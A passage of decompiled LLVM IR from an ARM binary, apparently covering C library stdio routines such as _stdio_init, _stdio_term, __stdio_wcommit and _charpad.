bb41:                                             ; preds = %dec_label_pc_136c0
  %v1_136d8 = load i32, i32* @sb, align 4
  %v2_136d8 = inttoptr i32 %v1_136d8 to i16*
  %v3_136d8 = load i16, i16* %v2_136d8, align 2
  %v4_136d8 = zext i16 %v3_136d8 to i32
  %v2_136dc = or i32 %v4_136d8, 256
  store i32 %v2_136dc, i32* %r3.global-to-local, align 4
  %v2_136e0 = trunc i32 %v2_136dc to i16
  store i16 %v2_136e0, i16* %v2_136d8, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_136c0, %bb41
  %v0_136e4 = load i32, i32* @r5, align 4
  %v1_136e4 = load i32, i32* @r4, align 4
  %v2_136e4 = inttoptr i32 %v1_136e4 to i32*
  store i32 %v0_136e4, i32* %v2_136e4, align 4
  br label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %bb40, %.thread7
  %v0_136e8 = load i32, i32* @sb, align 4
  %v1_136e8 = add i32 %v0_136e8, 8
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r3.global-to-local, align 4
  %v2_136ec = icmp eq i32 %v3_136e8, 0
  br i1 %v2_136ec, label %dec_label_pc_136f4, label %bb42

dec_label_pc_136f4:                               ; preds = %dec_label_pc_136e8
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_136f8 = call i32 @malloc(i32 4096)
  store i32 %v1_136f8, i32* %r0.global-to-local, align 4
  %v2_136fc = icmp eq i32 %v1_136f8, 0
  %v1_1370c.pre = load i32, i32* @sb, align 4
  br i1 %v2_136fc, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_136f4
  %v2_13700 = inttoptr i32 %v1_1370c.pre to i16*
  %v3_13700 = load i16, i16* %v2_13700, align 2
  %v4_13700 = zext i16 %v3_13700 to i32
  %v2_13704 = add i32 %v1_136f8, 4096
  store i32 %v2_13704, i32* %r2.global-to-local, align 4
  %v2_13708 = or i32 %v4_13700, 16384
  store i32 %v2_13708, i32* %r3.global-to-local, align 4
  %v2_1370c = add i32 %v1_1370c.pre, 8
  %v3_1370c = inttoptr i32 %v2_1370c to i32*
  store i32 %v1_136f8, i32* %v3_1370c, align 4
  %v1_13710 = load i32, i32* %r2.global-to-local, align 4
  %v2_13710 = load i32, i32* @sb, align 4
  %v3_13710 = add i32 %v2_13710, 12
  %v4_13710 = inttoptr i32 %v3_13710 to i32*
  store i32 %v1_13710, i32* %v4_13710, align 4
  %v1_13714 = load i32, i32* %r3.global-to-local, align 4
  %v2_13714 = trunc i32 %v1_13714 to i16
  %v3_13714 = load i32, i32* @sb, align 4
  %v4_13714 = inttoptr i32 %v3_13714 to i16*
  store i16 %v2_13714, i16* %v4_13714, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_136f4
  %v2_1370c21 = add i32 %v1_1370c.pre, 8
  %v3_1370c22 = inttoptr i32 %v2_1370c21 to i32*
  store i32 0, i32* %v3_1370c22, align 4
  %v2_13718 = load i32, i32* @sb, align 4
  %v3_13718 = add i32 %v2_13718, 12
  %v4_13718 = inttoptr i32 %v3_13718 to i32*
  store i32 0, i32* %v4_13718, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_136e8, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_13724 = load i32, i32* @fp, align 4
  %v2_13724 = add i32 %v0_13724, 60
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  %v4_13724 = load i32, i32* %v3_13724, align 4
  store i32 %v4_13724, i32* %r3.global-to-local, align 4
  %v2_13728 = load i32, i32* @sb, align 4
  %v3_13728 = add i32 %v2_13728, 2
  %v4_13728 = inttoptr i32 %v3_13728 to i8*
  store i8 0, i8* %v4_13728, align 1
  %v0_1372c = load i32, i32* @sb, align 4
  %v1_1372c = inttoptr i32 %v0_1372c to i16*
  %v2_1372c = load i16, i16* %v1_1372c, align 2
  %v3_1372c = zext i16 %v2_1372c to i32
  store i32 %v3_1372c, i32* %r2.global-to-local, align 4
  %v0_13730 = load i32, i32* %r3.global-to-local, align 4
  %v1_13730 = inttoptr i32 %v0_13730 to i32*
  %v2_13730 = load i32, i32* %v1_13730, align 4
  store i32 %v2_13730, i32* %r1.global-to-local, align 4
  %v1_13734 = add i32 %v0_1372c, 8
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  %v3_13734 = load i32, i32* %v2_13734, align 4
  store i32 %v3_13734, i32* %r3.global-to-local, align 4
  %v1_13738 = and i32 %v3_1372c, 8192
  %v2_13738 = icmp eq i32 %v1_13738, 0
  %v2_1373c = add i32 %v0_1372c, 20
  %v3_1373c = inttoptr i32 %v2_1373c to i32*
  store i32 %v3_13734, i32* %v3_1373c, align 4
  %v0_13740 = load i32, i32* %r0.global-to-local, align 4
  %v1_13740 = load i32, i32* @sb, align 4
  %v2_13740 = add i32 %v1_13740, 44
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v0_13740, i32* %v3_13740, align 4
  %v0_13744 = load i32, i32* %r1.global-to-local, align 4
  %v1_13744 = load i32, i32* @sb, align 4
  %v2_13744 = add i32 %v1_13744, 52
  %v3_13744 = inttoptr i32 %v2_13744 to i32*
  store i32 %v0_13744, i32* %v3_13744, align 4
  %v0_13748 = load i32, i32* %r3.global-to-local, align 4
  %v1_13748 = load i32, i32* @sb, align 4
  %v2_13748 = add i32 %v1_13748, 24
  %v3_13748 = inttoptr i32 %v2_13748 to i32*
  store i32 %v0_13748, i32* %v3_13748, align 4
  %v0_1374c = load i32, i32* %r3.global-to-local, align 4
  %v1_1374c = load i32, i32* @sb, align 4
  %v2_1374c = add i32 %v1_1374c, 28
  %v3_1374c = inttoptr i32 %v2_1374c to i32*
  store i32 %v0_1374c, i32* %v3_1374c, align 4
  %v0_13750 = load i32, i32* %r3.global-to-local, align 4
  %v1_13750 = load i32, i32* @sb, align 4
  %v2_13750 = add i32 %v1_13750, 16
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  store i32 %v0_13750, i32* %v3_13750, align 4
  br i1 %v2_13738, label %dec_label_pc_1380c, label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1375c = load i32, i32* @fp, align 4
  %v2_1375c = add i32 %v0_1375c, 36
  %v3_1375c = inttoptr i32 %v2_1375c to i32*
  %v4_1375c = load i32, i32* %v3_1375c, align 4
  store i32 %v4_1375c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_13764 = add i32 %v0_1375c, 112
  %v3_13764 = inttoptr i32 %v2_13764 to i32*
  %v4_13764 = load i32, i32* %v3_13764, align 4
  store i32 %v4_13764, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1376c = ptrtoint i32* %stack_var_-56 to i32
  %v2_13770 = add i32 %v0_1375c, 76
  %v3_13770 = inttoptr i32 %v2_13770 to i32*
  %v4_13770 = load i32, i32* %v3_13770, align 4
  store i32 %v4_1375c, i32* %r1.global-to-local, align 4
  store i32 %v4_13764, i32* %r2.global-to-local, align 4
  store i32 %v2_1376c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13770)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1378c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1378c, i32* %r0.global-to-local, align 4
  %v0_13790 = load i32, i32* @fp, align 4
  %v2_13790 = add i32 %v0_13790, 16
  %v3_13790 = inttoptr i32 %v2_13790 to i32*
  %v4_13790 = load i32, i32* %v3_13790, align 4
  call void @__pseudo_branch(i32 %v4_13790)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_137a0 = load i32, i32* @fp, align 4
  %v2_137a0 = add i32 %v0_137a0, 100
  %v3_137a0 = inttoptr i32 %v2_137a0 to i32*
  %v4_137a0 = load i32, i32* %v3_137a0, align 4
  store i32 %v4_137a0, i32* %r4.global-to-local, align 4
  %v0_137a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_137a4, i32* %r1.global-to-local, align 4
  store i32 %v4_137a0, i32* %r2.global-to-local, align 4
  store i32 %v2_1355c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13770)
  store i32 %v4_137a0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13790)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_137c8 = load i32, i32* @fp, align 4
  %v2_137c8 = add i32 %v0_137c8, 48
  %v3_137c8 = inttoptr i32 %v2_137c8 to i32*
  %v4_137c8 = load i32, i32* %v3_137c8, align 4
  store i32 %v4_137c8, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_137d0 = inttoptr i32 %v4_137c8 to i32*
  %v2_137d0 = load i32, i32* %v1_137d0, align 4
  store i32 %v2_137d0, i32* %r2.global-to-local, align 4
  store i32 %v2_1355c, i32* %r0.global-to-local, align 4
  %v1_137d8 = load i32, i32* @sb, align 4
  %v2_137d8 = add i32 %v1_137d8, 32
  %v3_137d8 = inttoptr i32 %v2_137d8 to i32*
  store i32 %v2_137d0, i32* %v3_137d8, align 4
  %v0_137dc = load i32, i32* @fp, align 4
  %v1_137dc = load i32, i32* %r3.global-to-local, align 4
  %v2_137dc = add i32 %v1_137dc, %v0_137dc
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  %v4_137dc = load i32, i32* %v3_137dc, align 4
  store i32 %v4_137dc, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_137e4 = load i32, i32* @sb, align 4
  %v1_137e4 = load i32, i32* @ip, align 4
  %v2_137e4 = inttoptr i32 %v1_137e4 to i32*
  store i32 %v0_137e4, i32* %v2_137e4, align 4
  call void @__pseudo_branch(i32 %v4_137dc)
  store i32 %v2_1376c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_137dc)
  br label %dec_label_pc_1380c

dec_label_pc_13808:                               ; preds = %dec_label_pc_1359c, %dec_label_pc_13588, %dec_label_pc_135a8
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1380c

dec_label_pc_1380c:                               ; preds = %bb42, %dec_label_pc_135e0, %dec_label_pc_13758, %dec_label_pc_13808
  %v0_1380c = load i32, i32* @sb, align 4
  store i32 %v0_1380c, i32* %r0.global-to-local, align 4
  %v2_13814 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13814, i32* @r4, align 4
  store i32 %v6_13548, i32* @r5, align 4
  store i32 %v9_13548, i32* @r6, align 4
  store i32 %v18_13548, i32* @sb, align 4
  store i32 %v24_13548, i32* @fp, align 4
  ret i32 %v0_1380c

; uselistorder directives
  uselistorder i32 %v1_1370c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_136a0, { 1, 2, 0 }
  uselistorder i32 %v0_1366c, { 1, 0 }
  uselistorder i32 %v1_13630, { 1, 0 }
  uselistorder i32 %v0_13630, { 1, 0 }
  uselistorder i32 %v1_13618, { 1, 0, 2 }
  uselistorder i32 %v1_135d0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1380c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_13808, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_136e8, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_13660._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13608, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_135b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13588, { 1, 2, 0 }
}

define i32 @function_13820(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13820:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_13820 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13820, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_13820
  %v3_13828 = and i32 %arg4, %arg3
  %v2_1382c = trunc i32 %v3_13828 to i16
  %v4_1382c = inttoptr i32 %v3_13828 to i16*
  store i16 %v2_1382c, i16* %v4_1382c, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_13820, %bb
  %v10_1384c = phi i32 [ %tmp, %dec_label_pc_13820 ], [ 0, %bb ]
  ret i32 %v10_1384c

; uselistorder directives
  uselistorder i32 %v3_13828, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_13854 = call i32 @__GI___errno_location()
  store i32 %v0_13854, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_13860 = inttoptr i32 %v0_13854 to i32*
  %v2_13860 = load i32, i32* %v1_13860, align 4
  store i32 %v2_13860, i32* @r6, align 4
  %v1_13864 = call i32 @isatty(i32 0)
  %v2_1386c = icmp eq i32 %v1_13864, 0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r4, align 4
  br i1 %v2_1386c, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_13878 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 764) to i16*), align 4
  %v7_13878 = zext i16 %v5_13878 to i32
  %v2_1387c = xor i32 %v7_13878, 256
  store i32 %v2_1387c, i32* @r3, align 4
  %v2_13880 = trunc i32 %v2_1387c to i16
  store i16 %v2_13880, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 764) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_13888 = call i32 @isatty(i32 1)
  %v2_1388c = icmp eq i32 %v1_13888, 0
  br i1 %v2_1388c, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_13894 = load i32, i32* @r4, align 4
  %v2_13898 = add i32 %v1_13894, 844
  %v3_13898 = inttoptr i32 %v2_13898 to i16*
  %v4_13898 = load i16, i16* %v3_13898, align 2
  %v2_1389c = xor i16 %v4_13898, 256
  store i16 %v2_1389c, i16* %v3_13898, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_138a4 = load i32, i32* @r6, align 4
  %v1_138a4 = load i32, i32* @r5, align 4
  %v2_138a4 = inttoptr i32 %v1_138a4 to i32*
  store i32 %v0_138a4, i32* %v2_138a4, align 4
  ret i32 %v1_13888

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -38508), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_138d4 = call i32 @memcpy()
  ret i32 %v0_138d4
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_138ec = load i32, i32* @r4, align 4
  store i32 %v3_138ec, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r6.global-to-local, align 4
  %v4_138fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 100) to i32*), align 4
  store i32 %v4_138fc, i32* @r0, align 4
  %v1_13900 = call i32 @__stdio_init_mutex(i32 %v4_138fc)
  store i32 %v1_13900, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13908 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 112) to i32*), align 4
  store i32 %v4_13908, i32* @r0, align 4
  %v1_1390c = call i32 @__stdio_init_mutex(i32 %v4_13908)
  store i32 %v1_1390c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_13914 = load i32, i32* %r6.global-to-local, align 4
  %v2_13914 = add i32 %v0_13914, 48
  %v3_13914 = inttoptr i32 %v2_13914 to i32*
  %v4_13914 = load i32, i32* %v3_13914, align 4
  store i32 %v4_13914, i32* %r3.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  %v1_1391c = inttoptr i32 %v4_13914 to i32*
  %v2_1391c = load i32, i32* %v1_1391c, align 4
  store i32 %v2_1391c, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_139685 = add i32 %v2_1391c, 56
  store i32 %v1_139685, i32* @r5, align 4
  %v2_1396c7 = icmp eq i32 %v2_1391c, 0
  store i32 %v1_139685, i32* %r0.global-to-local, align 4
  br i1 %v2_1396c7, label %dec_label_pc_13978, label %dec_label_pc_13928

dec_label_pc_13928:                               ; preds = %entry, %dec_label_pc_1395c.dec_label_pc_13928_crit_edge
  %v1_13928 = phi i32 [ %v1_13928.pre, %dec_label_pc_1395c.dec_label_pc_13928_crit_edge ], [ 44, %entry ]
  %v0_13928 = phi i32 [ %v0_1397c.pre, %dec_label_pc_1395c.dec_label_pc_13928_crit_edge ], [ %v0_13914, %entry ]
  %v2_13928 = add i32 %v0_13928, %v1_13928
  %v3_13928 = inttoptr i32 %v2_13928 to i32*
  %v4_13928 = load i32, i32* %v3_13928, align 4
  store i32 %v4_13928, i32* @ip, align 4
  store i32 80180, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13928)
  %v0_13934 = load i32, i32* %r0.global-to-local, align 4
  %v2_13934 = icmp eq i32 %v0_13934, 0
  %v0_13938 = load i32, i32* @r5, align 4
  store i32 %v0_13938, i32* @r0, align 4
  br i1 %v2_13934, label %dec_label_pc_1395c, label %dec_label_pc_13940

dec_label_pc_13940:                               ; preds = %dec_label_pc_13928
  %v0_13940 = load i32, i32* @r4, align 4
  %v1_13940 = add i32 %v0_13940, 8
  %v2_13940 = inttoptr i32 %v1_13940 to i32*
  %v3_13940 = load i32, i32* %v2_13940, align 4
  store i32 %v3_13940, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_13948 = add i32 %v0_13940, 20
  %v3_13948 = inttoptr i32 %v2_13948 to i32*
  store i32 %v3_13940, i32* %v3_13948, align 4
  %v0_1394c = load i32, i32* %r2.global-to-local, align 4
  %v1_1394c = trunc i32 %v0_1394c to i16
  %v2_1394c = load i32, i32* @r4, align 4
  %v3_1394c = inttoptr i32 %v2_1394c to i16*
  store i16 %v1_1394c, i16* %v3_1394c, align 2
  %v0_13950 = load i32, i32* %r3.global-to-local, align 4
  %v1_13950 = load i32, i32* @r4, align 4
  %v2_13950 = add i32 %v1_13950, 24
  %v3_13950 = inttoptr i32 %v2_13950 to i32*
  store i32 %v0_13950, i32* %v3_13950, align 4
  %v0_13954 = load i32, i32* %r3.global-to-local, align 4
  %v1_13954 = load i32, i32* @r4, align 4
  %v2_13954 = add i32 %v1_13954, 28
  %v3_13954 = inttoptr i32 %v2_13954 to i32*
  store i32 %v0_13954, i32* %v3_13954, align 4
  %v0_13958 = load i32, i32* %r3.global-to-local, align 4
  %v1_13958 = load i32, i32* @r4, align 4
  %v2_13958 = add i32 %v1_13958, 16
  %v3_13958 = inttoptr i32 %v2_13958 to i32*
  store i32 %v0_13958, i32* %v3_13958, align 4
  br label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13928, %dec_label_pc_13940
  %v0_1395c = load i32, i32* %r7.global-to-local, align 4
  %v1_1395c = load i32, i32* @r4, align 4
  %v2_1395c = add i32 %v1_1395c, 52
  %v3_1395c = inttoptr i32 %v2_1395c to i32*
  store i32 %v0_1395c, i32* %v3_1395c, align 4
  %v1_13960 = call i32 @__stdio_init_mutex(i32 %v0_13938)
  store i32 %v1_13960, i32* %r0.global-to-local, align 4
  %v0_13964 = load i32, i32* @r4, align 4
  %v1_13964 = add i32 %v0_13964, 32
  %v2_13964 = inttoptr i32 %v1_13964 to i32*
  %v3_13964 = load i32, i32* %v2_13964, align 4
  store i32 %v3_13964, i32* @r4, align 4
  %v1_13968 = add i32 %v3_13964, 56
  store i32 %v1_13968, i32* @r5, align 4
  %v2_1396c = icmp eq i32 %v3_13964, 0
  store i32 %v1_13968, i32* %r0.global-to-local, align 4
  %v0_1397c.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_1396c, label %dec_label_pc_13978, label %dec_label_pc_1395c.dec_label_pc_13928_crit_edge

dec_label_pc_1395c.dec_label_pc_13928_crit_edge:  ; preds = %dec_label_pc_1395c
  %v1_13928.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13928

dec_label_pc_13978:                               ; preds = %dec_label_pc_1395c, %entry
  %v1_139a814 = phi i32 [ %v1_139685, %entry ], [ %v1_13968, %dec_label_pc_1395c ]
  %v0_1397c = phi i32 [ %v0_13914, %entry ], [ %v0_1397c.pre, %dec_label_pc_1395c ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_1397c = add i32 %v0_1397c, 48
  %v3_1397c = inttoptr i32 %v2_1397c to i32*
  %v4_1397c = load i32, i32* %v3_1397c, align 4
  store i32 %v4_1397c, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_1397c to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_1399c4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1399c4, label %dec_label_pc_139a4, label %dec_label_pc_13988

dec_label_pc_13988:                               ; preds = %dec_label_pc_13978, %dec_label_pc_1399c
  %v1_13990 = phi i32 [ %storemerge, %dec_label_pc_1399c ], [ %storemerge2, %dec_label_pc_13978 ]
  %v1_13988 = inttoptr i32 %v1_13990 to i16*
  %v2_13988 = load i16, i16* %v1_13988, align 2
  %v3_13988 = zext i16 %v2_13988 to i32
  store i32 %v3_13988, i32* %r3.global-to-local, align 4
  %v1_1398c = and i32 %v3_13988, 64
  %v2_1398c = icmp eq i32 %v1_1398c, 0
  br i1 %v2_1398c, label %dec_label_pc_1399c, label %bb

bb:                                               ; preds = %dec_label_pc_13988
  store i32 %v1_13990, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1399c

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13988, %bb
  %v1_13994 = xor i1 %v2_1398c, true
  call void @__pseudo_cond_branch(i1 %v1_13994, i32 ptrtoint (i32* @global_var_139c0.877 to i32))
  %v0_13998 = load i32, i32* %r4.global-to-local, align 4
  %v1_13998 = add i32 %v0_13998, 32
  %storemerge.in = inttoptr i32 %v1_13998 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_1399c = icmp eq i32 %storemerge, 0
  br i1 %v2_1399c, label %dec_label_pc_1399c.dec_label_pc_139a4_crit_edge, label %dec_label_pc_13988

dec_label_pc_1399c.dec_label_pc_139a4_crit_edge:  ; preds = %dec_label_pc_1399c
  %v1_139a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %dec_label_pc_1399c.dec_label_pc_139a4_crit_edge, %dec_label_pc_13978
  %v1_139a8 = phi i32 [ %v1_139a8.pre, %dec_label_pc_1399c.dec_label_pc_139a4_crit_edge ], [ %v1_139a814, %dec_label_pc_13978 ]
  %v2_139a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_139a4, i32* %r4.global-to-local, align 4
  ret i32 %v1_139a8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13914, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 7, 1, 2, 3, 6, 8, 4, 5, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1399c, { 1, 0 }
  uselistorder label %dec_label_pc_13988, { 1, 0 }
  uselistorder label %dec_label_pc_1395c, { 1, 0 }
  uselistorder label %dec_label_pc_13928, { 1, 0 }
}

define i32 @function_139b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_139b0:
  %v0_139b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139b0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_139b0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_139b0, %bb
  %v4_139bc = phi i32 [ %arg1, %dec_label_pc_139b0 ], [ 0, %bb ]
  ret i32 %v4_139bc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139c0 = load i32, i32* @r4, align 4
  store i32 %v3_139c0, i32* %stack_var_-8, align 4
  %v0_139c4 = load i32, i32* @r0, align 4
  %v1_139c4 = add i32 %v0_139c4, 8
  %v2_139c4 = inttoptr i32 %v1_139c4 to i32*
  %v3_139c4 = load i32, i32* %v2_139c4, align 4
  %v1_139c8 = add i32 %v0_139c4, 16
  %v2_139c8 = inttoptr i32 %v1_139c8 to i32*
  %v3_139c8 = load i32, i32* %v2_139c8, align 4
  %v9_139cc = icmp eq i32 %v3_139c8, %v3_139c4
  store i32 %v0_139c4, i32* %r4.global-to-local, align 4
  br i1 %v9_139cc, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_139c4, i32* %v2_139c8, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_139d8 = xor i1 %v9_139cc, true
  call void @__pseudo_cond_branch(i1 %v1_139d8, i32 ptrtoint (i32* @global_var_19550.878 to i32))
  %v0_139dc = load i32, i32* %r4.global-to-local, align 4
  %v1_139dc = add i32 %v0_139dc, 8
  %v2_139dc = inttoptr i32 %v1_139dc to i32*
  %v3_139dc = load i32, i32* %v2_139dc, align 4
  %v1_139e0 = add i32 %v0_139dc, 16
  %v2_139e0 = inttoptr i32 %v1_139e0 to i32*
  %v3_139e0 = load i32, i32* %v2_139e0, align 4
  %v2_139e4 = sub i32 %v3_139e0, %v3_139dc
  %v2_139e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_139e8, i32* @r4, align 4
  ret i32 %v2_139e4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_139f0 = load i32, i32* @r4, align 4
  %v6_139f0 = load i32, i32* @r5, align 4
  %v9_139f0 = load i32, i32* @r6, align 4
  %v12_139f0 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_139fc = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_139fc, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_13a142 = icmp eq i32 %arg3, 0
  br i1 %v2_13a142, label %dec_label_pc_13a34, label %dec_label_pc_13a28

dec_label_pc_13a10:                               ; preds = %dec_label_pc_13a28
  %v1_13a10 = add i32 %v0_13a10, -1
  store i32 %v1_13a10, i32* @r4, align 4
  %v2_13a14 = icmp eq i32 %v1_13a10, 0
  %v0_13a20 = load i32, i32* @r7, align 4
  br i1 %v2_13a14, label %dec_label_pc_13a34.loopexit, label %dec_label_pc_13a28

dec_label_pc_13a28:                               ; preds = %entry, %dec_label_pc_13a10
  %v0_13a204 = phi i32 [ %v0_13a20, %dec_label_pc_13a10 ], [ %arg1, %entry ]
  %v3_13a28 = inttoptr i32 %v0_13a204 to i16*
  %v4_13a28 = call i32 @__stdio_fwrite(i32 %v10_139fc, i32 1, i16* %v3_13a28)
  %v7_13a2c = icmp eq i32 %v4_13a28, 1
  %v0_13a10 = load i32, i32* @r4, align 4
  br i1 %v7_13a2c, label %dec_label_pc_13a10, label %dec_label_pc_13a34.loopexit

dec_label_pc_13a34.loopexit:                      ; preds = %dec_label_pc_13a10, %dec_label_pc_13a28
  %v0_13a34.ph = phi i32 [ %v0_13a10, %dec_label_pc_13a28 ], [ 0, %dec_label_pc_13a10 ]
  %v1_13a34.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a34

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13a34.loopexit, %entry
